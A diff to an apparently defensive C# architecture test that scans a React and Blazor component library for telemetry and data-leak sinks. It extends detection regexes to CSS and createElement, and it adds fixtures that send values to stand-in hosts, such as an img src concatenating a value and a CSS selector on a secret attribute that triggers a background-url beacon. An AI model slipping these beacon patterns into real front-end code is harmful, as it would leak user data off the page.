@@ -8,7 +8,7 @@ namespace Harborline.Architecture.Tests;
 public sealed class ComponentLibraryTelemetryArchitectureTests
 {
     private static readonly string[] Roots = ["react", "blazor", "shared"];
-    private static readonly HashSet<string> Extensions = new(StringComparer.OrdinalIgnoreCase) { ".ts", ".tsx", ".mts", ".cts", ".js", ".jsx", ".mjs", ".cjs", ".cs", ".razor" };
+    private static readonly HashSet<string> Extensions = new(StringComparer.OrdinalIgnoreCase) { ".ts", ".tsx", ".mts", ".cts", ".js", ".jsx", ".mjs", ".cjs", ".cs", ".razor", ".css" };
     private static readonly HashSet<string> Skip = new(StringComparer.OrdinalIgnoreCase) { "artifacts", "bin", "coverage", "dist", "node_modules", "obj", "tests", "test", "__tests__", "stories" };
     // Raw source text, no comment or string stripping: a mention in a comment or string is a finding too,
     // and only an exact allow-list row admits it. Bare console/Console/sendBeacon tokens keep a comment
@@ -22,7 +22,7 @@ public sealed class ComponentLibraryTelemetryArchitectureTests
         + @"|location\s*(?:\??\.\s*[\w$]+\s*)?(?:=(?!=)|\[)|location\s*\??\.\s*(?:assign|replace)\b|open\s*\(|(?:window|self|globalThis)\s*\??\.\s*open\b|url\s*\(\s*(?!(?<q>['""]?)[^'""$@{}()+\r\n]*\k<q>\s*\))"
         + @"|System\s*\.\s*Net\s*\.\s*(?:Http|Sockets|WebSockets)\b|JSImport\b|JSHost\b|NavigateTo\b|navigation\s*\??\.\s*(?:navigate|reload|traverseTo|back|forward)\b)"
         + @"|Http(?:Client|MessageHandler)|WebClient|WebRequest|Socket|TcpClient|UdpClient|HttpListener"
-        + @"|@opentelemetry/|\.\s*src(?:set)?\s*=(?!=)|setAttribute\s*\(\s*['""`]src(?:set)?['""`]"
+        + @"|@opentelemetry/|\bcreateElement\b|\.\s*src(?:set)?\s*=(?!=)|setAttribute\s*\(\s*['""`]src(?:set)?['""`]"
         + @"|(?<![\w$.\-])(?i:src|srcset|href|action|formaction|poster|data|ping|background)\s*=\s*(?:\{(?!\s*(?:'[^'\\\r\n]*'|""[^""\\\r\n]*"")\s*\})|""[^""\r\n]*@|'[^'\r\n]*@|@)"
         + @"|(?=\{\s*\.\.\.|@attributes\b)(?<=<(?:img|a|script|iframe|link|source|form|video|audio|object|embed)\b(?:[^<>]|=>)*)", RegexOptions.Compiled);
     // Every import, export, require or dynamic import in a JS-family file reads one string-literal specifier from the
@@ -54,6 +54,7 @@ public sealed class ComponentLibraryTelemetryArchitectureTests
         "projections/blazor/member/ContentRemoved.test.cs:1",
         "projections/blazor/member/CrossType.test.cs:1",
         "projections/blazor/member/GroupConditional.test.cs:1",
+        "projections/blazor/member/TargetRemoved.test.cs:1",
         "projections/blazor/member/ValueLeak.test.cs:1",
         "projections/blazor/member/WhenRemoved.test.cs:1",
         "projections/blazor/order/Order.test.cs:1",
@@ -78,6 +79,7 @@ public sealed class ComponentLibraryTelemetryArchitectureTests
         "projections/react/console.cs:1",
         "projections/react/console.ts:1",
         "projections/react/console.ts:2",
+        "projections/react/create-element.ts:1",
         "projections/react/debug.razor:1",
         "projections/react/debug.razor:2",
         "projections/react/division-comment.ts:1",
@@ -87,6 +89,8 @@ public sealed class ComponentLibraryTelemetryArchitectureTests
         "projections/react/dot-split.ts:1",
         "projections/react/dup.ts:1",
         "projections/react/dup.ts:2",
+        "projections/react/emit.css:1",
+        "projections/react/emit.css:2",
         "projections/react/error.cjs:1",
         "projections/react/error.cjs:2",
         "projections/react/event.ts:1",
@@ -333,6 +337,8 @@ public sealed class ComponentLibraryTelemetryArchitectureTests
             File.WriteAllText(Path.Combine(blazor, "pkg", "Pkg.csproj"), "<Project Sdk=\"Microsoft.NET.Sdk.Razor\"><ItemGroup><Compile Include=\"../member/**/*.cs\" Exclude=\"../member/Excluded.test.cs\" /><Compile Include=\"../member/Removed.test.cs\" /><Compile Remove=\"../member/Removed.test.cs\" /><Content Include=\"../member/CrossType.test.cs\" /><Compile Remove=\"../member/CrossType.test.cs\" /><Content Remove=\"../member/ContentRemoved.test.cs\" /></ItemGroup></Project>\n");
             File.WriteAllText(Path.Combine(blazor, "pkg", "Default.test.cs"), "Console.WriteLine(value);\n");
             File.WriteAllText(Path.Combine(blazor, "member", "ValueLeak.test.cs"), "Console.WriteLine(value);\n");
+            File.WriteAllText(Path.Combine(blazor, "member", "TargetRemoved.test.cs"), "Console.WriteLine(value);\n");
+            File.WriteAllText(Path.Combine(blazor, "pkg", "Pkg.csproj"), File.ReadAllText(Path.Combine(blazor, "pkg", "Pkg.csproj")).Replace("</Project>", "<Target Name=\"Cleanup\" AfterTargets=\"Build\"><ItemGroup><Compile Remove=\"../member/TargetRemoved.test.cs\" /></ItemGroup></Target></Project>", StringComparison.Ordinal));
             File.WriteAllText(Path.Combine(blazor, "member", "Excluded.test.cs"), "Console.WriteLine(value);\n");
             File.WriteAllText(Path.Combine(blazor, "member", "Removed.test.cs"), "Console.WriteLine(value);\n");
             // MSBuild keeps one list per item type: a Remove on one type leaves the same path in another.
@@ -378,6 +384,8 @@ public sealed class ComponentLibraryTelemetryArchitectureTests
             File.WriteAllText(Path.Combine(blazor, "order", "Order.test.cs"), "Console.WriteLine(value);\n");
             // A URL attribute whose value is not one string literal can carry a value off the page.
             File.WriteAllText(Path.Combine(dir, "url-attr.tsx"), "<img src={'https://x.invalid/p?v=' + value} />\n<img src={'https://x.invalid/fixed.png'} />\n<a href=\"/fixed\">x</a>\n<img srcSet={`${base}/a.png 2x`} />\n");
+            File.WriteAllText(Path.Combine(dir, "create-element.ts"), "React.createElement('img', {src: collector + value});\n");
+            File.WriteAllText(Path.Combine(dir, "emit.css"), "@import 'https://example.invalid/a.css';\n[data-value=secret] { background: url(https://example.invalid/beacon); }\n");
             File.WriteAllText(Path.Combine(dir, "url-attr.razor"), "<img src=\"https://x.invalid/p?v=@Value\" />\n<img src=\"/fixed.png\" />\n<a href=@Value>x</a>\n<form action=\"@Target\"></form>\n");
             File.WriteAllText(Path.Combine(dir, "sinks.ts"), "fetchLater(url, { method: 'POST', body: value });\nconst transport = new WebTransport(url + value);\nconst peer = new RTCPeerConnection(config);\nconst stream = new EventSource(url + value);\nform.submit();\nform.requestSubmit();\nlocation = url + value;\nwindow.location.href = url + value;\nlocation.assign(url + value);\nlocation.replace(url + value);\nwindow.open(url + value);\nconst style = { backgroundImage: `url(${url + value})` };\nconst path = location.pathname; const css = 'url(/fixed.png)';\nnavigation.navigate(url + value);\n");
             File.WriteAllText(Path.Combine(dir, "sinks.cs"), "using var client = new HttpClient();\nvar web = new WebClient();\nvar request = HttpWebRequest.Create(url);\nvar socket = new Socket(family, type, protocol);\nvar tcp = new TcpClient(host, port);\nusing System.Net.Http;\nNavigation.NavigateTo(url + value);\n");
@@ -443,6 +451,7 @@ public sealed class ComponentLibraryTelemetryArchitectureTests
         var path = Path.GetRelativePath(root, file).Replace('\\', '/');
         var offsets = Emit.Matches(source).Select(match => match.Index);
         var extension = Path.GetExtension(file);
+        if (extension.Equals(".css", StringComparison.OrdinalIgnoreCase)) offsets = offsets.Concat(Regex.Matches(source, @"@import\b|url\s*\(|(?:image-set|src|attr)\s*\(|\\", RegexOptions.IgnoreCase).Select(match => match.Index));
         if (ScriptExtensions.Contains(extension)) offsets = offsets.Concat(Imports(source).Unread);
         if (extension is ".cs" or ".razor") offsets = offsets.Concat(InteropCalls(file, source));
         return offsets.Select(index => source.AsSpan(0, index).Count('\n') + 1).Distinct().Order()
@@ -596,7 +605,7 @@ public sealed class ComponentLibraryTelemetryArchitectureTests
     private static IEnumerable<string> ProjectInputs(string root, string project, List<Finding> findings)
     {
         var dir = Path.GetDirectoryName(project)!;
-        static bool Conditional(XElement element) => element.AncestorsAndSelf().Any(e => e.Attribute("Condition") is not null || e.Name.LocalName is "When" or "Otherwise");
+        static bool Conditional(XElement element) => element.AncestorsAndSelf().Any(e => e.Attribute("Condition") is not null || e.Name.LocalName is "When" or "Otherwise" or "Target");
         static bool SetsIsPackable(IEnumerable<XElement> elements) => elements.Any(e => e.Name.LocalName == "IsPackable");
         var chain = new List<string>();
         for (var up = dir; up is not null; up = Path.GetDirectoryName(up))
@@ -725,6 +734,7 @@ public sealed class ComponentLibraryTelemetryArchitectureTests
                 Assert.True(file is not null, $"{script}: resolve {target} before scanning");
                 if (!seen.Add(file) || !Extensions.Contains(Path.GetExtension(file))) continue;
                 reached.Add(file);
+                if (!ScriptExtensions.Contains(Path.GetExtension(file))) continue;
                 foreach (var (spec, type) in Imports(File.ReadAllText(file)).Specs)
                 {
                     var key = alias.Keys.FirstOrDefault(name => spec == name || spec.StartsWith(name + "/", StringComparison.Ordinal));
